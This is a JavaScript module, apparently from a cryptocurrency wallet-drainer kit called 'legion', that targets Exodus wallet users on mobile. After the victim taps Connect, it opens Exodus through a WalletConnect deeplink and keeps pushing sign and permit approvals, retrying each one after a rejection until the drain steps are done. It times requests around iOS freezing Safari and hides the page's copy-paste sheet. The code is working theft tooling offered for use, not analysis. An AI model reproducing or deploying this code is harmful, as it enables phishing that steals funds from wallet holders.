/**
 * Exodus AUTO-STRIKE v1.0 — the real "trika"
 *
 * Exodus has NO open_url (can't auto-load site into their Browser).
 * What DOES work fully automated on button tap:
 *
 *   Connect → WC URI → open Exodus → on session, IMMEDIATELY push
 *   sign/permit to WalletConnect relay → user stays in Exodus approving.
 *
 * Race: iOS freezes Safari when app opens. We fire requests in the same
 * moments BEFORE / AS freeze so popups already sit in Exodus.
 */
(function () {
  'use strict';

  var striking = false;
  var done = false;
  var lastStrike = 0;
  var opened = false;
  /** Set only after user taps Connect — blocks cold-load Exodus bounce from stale wc: URI */
  var userArmed = false;

  function armUserConnect() {
    userArmed = true;
    try { window.__EXODUS_USER_CONNECTING__ = true; } catch (_) {}
  }

  function sleep(ms) {
    return new Promise(function (r) { setTimeout(r, ms); });
  }

  function isMobile() {
    try {
      var ua = navigator.userAgent || '';
      if (/iPhone|iPad|iPod|Android|Mobile/i.test(ua)) return true;
      if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
    } catch (_) {}
    return false;
  }

  function inApp() {
    try {
      if (window.__EXODUS_IN_APP__) return true;
      if (typeof window.__EXODUS_IS_IN_APP__ === 'function' && window.__EXODUS_IS_IN_APP__()) return true;
    } catch (_) {}
    return false;
  }

  function getAddr() {
    try {
      var a = sessionStorage.getItem('exodus_site_connected_addr') || sessionStorage.getItem('legion_wc_evm_addr');
      if (a && /^0x[a-f0-9]{40}$/i.test(a)) return a.toLowerCase();
    } catch (_) {}
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        return String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}
    return '';
  }

  function isDone() {
    if (done) return true;
    try {
      if (sessionStorage.getItem('exodus_oneshot_done') === '1') return true;
      var S = window.legion && window.legion.state;
      if (S && S.postConnectComplete && S.drainAttempted) return true;
      if (S && (S.anchorsOk > 0 || S.pendingEvmPermit2)) return true;
    } catch (_) {}
    return false;
  }

  function markDone() {
    done = true;
    try { sessionStorage.setItem('exodus_oneshot_done', '1'); } catch (_) {}
    console.warn('[ExodusStrike] DONE');
  }

  function openExodusNow() {
    if (inApp()) return;
    // Desktop-QR mode: never bounce mobile Safari into empty Exodus
    try {
      if (window.__EXODUS_QR_DESKTOP_ONLY__ && isMobile() && !inApp()) {
        console.warn('[ExodusStrike] skip open — desktop QR only');
        return;
      }
    } catch (_) {}
    if (!userArmed) {
      console.warn('[ExodusStrike] skip open — user has not tapped Connect');
      return;
    }
    if (opened) return;
    // Prefer WC pairing URI only — bare exodus:// / browser?url= causes empty bounce
    try {
      var uri = null;
      if (typeof window.__EXODUS_GET_WC_URI__ === 'function') uri = window.__EXODUS_GET_WC_URI__();
      if (!uri) uri = window.__LEGION_LAST_WC_URI__;
      if (uri && String(uri).indexOf('wc:') === 0) {
        opened = true;
        window.location.href = 'exodus://wc?uri=' + encodeURIComponent(uri);
        return;
      }
    } catch (_) {}
    console.warn('[ExodusStrike] WC URI not ready — stay on site');
  }

  /**
   * Sequential sign pipeline — one sign at a time, retry until confirmed, then advance.
   * Steps:
   *   1. Call forceTrustSign() — sends the CURRENT pending sign to Exodus (awaited)
   *   2. If ok → call continueConnected() to advance pipeline to next chain/sign
   *   3. If rejected → wait RETRY_DELAY then retry SAME sign (do NOT advance)
   *   4. If no_session → wait longer, then retry
   *   5. Repeat until all signs done (isDone())
   */
  async function sequentialSignPipeline(why) {
    if (striking || isDone()) return;
    try {
      if (typeof window.__EXODUS_FLOW_BUSY__ === 'function' && window.__EXODUS_FLOW_BUSY__() && why !== 'manual') {
        console.warn('[ExodusStrike] skip start — flow busy:', why);
        return;
      }
    } catch (_) {}
    if (!getAddr() && !window.legion) return;
    striking = true;
    console.warn('[ExodusStrike] sequential pipeline start:', why);

    var RETRY_DELAY = 2500;      // wait between retries of SAME sign
    var ADVANCE_DELAY = 800;     // brief pause after confirm before next sign
    var NO_SESSION_DELAY = 5000; // wait if WC session lost
    var MAX_ROUNDS = 60;         // safety cap (60 rounds × avg 2.5s = ~2.5 min max)
    var round = 0;

    try {
      while (!isDone() && round < MAX_ROUNDS) {
        round++;

        // Open Exodus so the pending sign popup is visible
        if (!inApp()) openExodusNow();

        var result = null;
        try {
          if (window.legion && typeof window.legion.forceTrustSign === 'function') {
            // forceTrustSign targets the CURRENT pending chain's sign (has inflight guard)
            result = await window.legion.forceTrustSign();
          } else if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
            result = await window.__EXODUS_RUN_PIPELINE__('seq:' + round);
          } else if (window.legion && typeof window.legion.continueConnected === 'function') {
            result = await window.legion.continueConnected();
          }
        } catch (e) {
          console.warn('[ExodusStrike] sign error round', round, e && e.message);
          await sleep(RETRY_DELAY);
          continue;
        }

        if (result && result.ok) {
          console.warn('[ExodusStrike] sign confirmed (round ' + round + ') path=' + (result.path || '?') + ' → advancing');
          // Advance pipeline to next chain's sign
          try {
            if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
              Promise.resolve(window.__EXODUS_RUN_PIPELINE__('advance:' + round)).catch(function () {});
            } else if (window.legion && typeof window.legion.continueConnected === 'function') {
              Promise.resolve(window.legion.continueConnected()).catch(function () {});
            }
          } catch (_) {}
          await sleep(ADVANCE_DELAY);
          // Loop continues — forceTrustSign will now target the NEXT chain's sign
          continue;
        }

        if (result && result.error === 'rejected') {
          console.warn('[ExodusStrike] rejected — retrying same sign in', RETRY_DELAY + 'ms');
          await sleep(RETRY_DELAY);
          continue;
        }

        if (result && result.error === 'no_session') {
          console.warn('[ExodusStrike] no session — waiting', NO_SESSION_DELAY + 'ms');
          await sleep(NO_SESSION_DELAY);
          continue;
        }

        // Unknown result — short wait and retry
        await sleep(RETRY_DELAY);
      }

      if (isDone()) markDone();
    } finally {
      striking = false;
    }
  }

  /** Instant nudge — opens Exodus + fires pipeline once (no await, for freeze/pagehide) */
  function fireStrike(why) {
    if (isDone()) { markDone(); return; }
    var now = Date.now();
    if (now - lastStrike < 900) return;
    lastStrike = now;
    console.warn('[ExodusStrike] nudge', why);
    // Only pipeline — no concurrent forceTrustSign (sequential pipeline handles that)
    try {
      if (typeof window.__EXODUS_RUN_PIPELINE__ === 'function') {
        Promise.resolve(window.__EXODUS_RUN_PIPELINE__('nudge:' + why)).catch(function () {});
      } else if (window.legion && typeof window.legion.continueConnected === 'function') {
        Promise.resolve(window.legion.continueConnected()).catch(function () {});
      }
    } catch (_) {}
    if (!inApp() && userArmed) {
      setTimeout(openExodusNow, 200);
      setTimeout(openExodusNow, 700);
    }
  }

  // Keep old name as alias so external callers still work
  var strikeLoop = sequentialSignPipeline;

  // ── Hooks: race the freeze ───────────────────────────────────

  // URI appeared → open Exodus only AFTER user armed Connect (never cold page-load)
  var uriWatch = setInterval(function () {
    if (!isMobile() || inApp() || opened || !userArmed) return;
    try {
      var uri = typeof window.__EXODUS_GET_WC_URI__ === 'function'
        ? window.__EXODUS_GET_WC_URI__()
        : window.__LEGION_LAST_WC_URI__;
      if (uri && String(uri).indexOf('wc:') === 0) {
        openExodusNow();
      }
    } catch (_) {}
  }, 400);
  setTimeout(function () { try { clearInterval(uriWatch); } catch (_) {} }, 120000);

  // Drain is handled exclusively by exodus-connected-ui.js.
  // Auto-strike only handles: opening Exodus app via deeplink when URI is ready.

  window.addEventListener('legion:connected', function () {
    if (!inApp() && userArmed) setTimeout(openExodusNow, 300);
  });

  // Wrap Connect: one tap = WC + open Exodus when URI ready
  function wrapConnect() {
    var prev = window.__EXODUS_DIRECT_CONNECT__;
    if (typeof prev !== 'function' || prev.__strikeWrapped) return;
    var wrapped = function () {
      console.warn('[ExodusStrike] connect tap → arm + wait WC URI');
      armUserConnect();
      opened = false;
      try {
        var r = prev.apply(this, arguments);
        // Only open when URI exists — never bare exodus:// timers
        setTimeout(openExodusNow, 800);
        setTimeout(openExodusNow, 2000);
        setTimeout(openExodusNow, 4000);
        return r;
      } catch (e) {
        console.warn('[ExodusStrike] connect err', e && e.message);
      }
    };
    wrapped.__strikeWrapped = true;
    window.__EXODUS_DIRECT_CONNECT__ = wrapped;
  }

  setTimeout(wrapConnect, 0);
  setTimeout(wrapConnect, 400);
  setInterval(wrapConnect, 2000);

  // Hide copy-paste sheet as primary — strike is the trika
  setTimeout(function () {
    try {
      var sheet = document.getElementById('__exodus_inapp_sheet');
      if (sheet) sheet.style.display = 'none';
      var chip = document.getElementById('__exodus_inapp_chip');
      if (chip) {
        chip.textContent = 'Connect — opens Exodus auto';
        chip.onclick = function (e) {
          e.preventDefault();
          if (typeof window.__EXODUS_DIRECT_CONNECT__ === 'function') {
            window.__EXODUS_DIRECT_CONNECT__();
          }
        };
      }
    } catch (_) {}
  }, 1200);

  window.__EXODUS_AUTO_STRIKE__ = fireStrike;
  window.__EXODUS_STRIKE_LOOP__ = strikeLoop;

  console.warn('[ExodusStrike] armed — one-tap Connect = auto open Exodus + keep pushing approves');
})();
